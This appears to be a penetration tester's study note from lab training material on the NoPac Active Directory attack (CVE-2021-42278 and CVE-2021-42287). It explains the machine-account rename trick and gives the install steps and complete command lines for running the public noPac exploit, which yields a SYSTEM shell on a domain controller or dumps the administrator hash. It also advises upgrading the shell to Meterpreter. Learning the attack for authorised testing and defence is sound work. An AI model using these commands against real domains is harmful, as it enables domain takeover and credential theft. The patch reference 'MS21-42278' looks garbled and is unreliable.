# NoPac

Exploit chaining CVE-2021-42278 (machine account name spoofing) and CVE-2021-42287 (KDC name lookup fallback) to allow any low-privilege domain user to impersonate a Domain Controller and obtain a SYSTEM-level shell or DA hash. Fully automated, requires no existing privilege beyond a valid domain user account.

Cross-links: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.13. Bleeding Edge: NoPac (CVE-2021-42278 + CVE-2021-42287)|AD.13]], [[Active Directory (Decision Tree)#The target has MachineAccountQuota > 0 and is unpatched (pre-Nov 2021). NoPac applies?|Decision Tree]]

---

## What problem it solves

When you have any valid domain user credential but no exploitable services, misconfigs, or password-spray results, NoPac provides a path to DA on unpatched (pre-November 2021) DCs. The attack abuses `MachineAccountQuota` (any domain user can create up to 10 machine accounts by default) to create and rename a machine account to match a DC's `sAMAccountName`.

## How it works (brief)

1. Create a machine account (any domain user can do this, default `MachineAccountQuota = 10`)
2. Rename the machine account's `sAMAccountName` to match a DC (e.g. `ACADEMY-EA-DC01`) without the `$` suffix
3. Request a TGT for that name, the KDC issues one because it found the renamed machine account
4. Rename the machine account back to something else (removing the conflict)
5. Request a TGS for the original DC name, the KDC can't find it now (it was renamed away), falls back to `DC01$`, and issues a service ticket with **DC-level PAC** because it thinks it's servicing the real DC

The resulting PAC contains Domain Admin/DC-level group memberships. The whole process takes seconds.

## Install

```bash
git clone https://github.com/Ridter/noPac.git
cd noPac
pip3 install -r requirements.txt
```

## Usage

```bash
# Step 1: Confirm vulnerability (checks MachineAccountQuota and DC patch level)
python3 scanner.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
# → "Got TGT with PAC" = vulnerable

# Step 2: Get interactive shell as SYSTEM on the DC
python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
  -dc-ip 172.16.5.5 -use-ldap \
  -shell --impersonate administrator
# → spawns semi-interactive shell
# → whoami → nt authority\system

# Alternative: dump hashes instead of getting a shell
python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
  -dc-ip 172.16.5.5 -use-ldap --impersonate administrator \
  -dump -just-dc-user INLANEFREIGHT/administrator
```

## Caveats

- Requires `MachineAccountQuota >= 1` (default = 10). Can check: `Get-ADObject (Get-ADRootDSE).defaultNamingContext -Properties ms-DS-MachineAccountQuota`.
- Patched by MS21-42278 (November 2021 Patch Tuesday). Any DC patched after November 2021 is immune.
- The exploit creates a machine account, this is a visible artifact. Clean up the created machine account after use in real engagements.
- Semi-interactive shell has limitations, use it to transfer a payload and get a proper Meterpreter/WinRM session.
- Will fail if the DC has a non-default `MachineAccountQuota = 0` (hardened environment).

#### Tags: #ModernTooling #NoPac #CVE202142278 #CVE202142287 #BleedingEdge #ActiveDirectory #MachineAccountQuota #HTBSupplementary
